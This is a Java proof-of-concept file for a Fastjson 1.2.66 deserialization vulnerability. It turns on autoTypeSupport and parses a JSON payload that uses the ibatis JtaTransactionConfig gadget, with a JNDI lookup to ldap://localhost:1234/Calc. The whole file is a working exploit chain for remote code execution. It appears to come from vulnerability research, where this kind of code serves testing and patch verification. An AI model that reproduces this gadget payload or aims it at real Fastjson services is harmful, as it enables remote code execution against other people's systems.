package Poc;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import java.rmi.server.ExportException;
/*
    需要开启autoTypeSupport
    <dependency>
        <groupId>org.apache.ibatis</groupId>
        <artifactId>ibatis-sqlmap</artifactId>
        <version>2.3.4.726</version>
    </dependency>
    <dependency>
        <groupId>javax</groupId>
        <artifactId>javaee-api</artifactId>
        <version>8.0.1</version>
    </dependency>
*/
public class Poc_1_2_66_c {
    public static void main(String[] args) throws ExportException {
        // turn on autoTypeSupport
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": {\"@type\":\"java.util.Properties\",\"UserTransaction\":\"ldap://localhost:1234/Calc\"}}";
        JSON.parse(payload);
    }
}
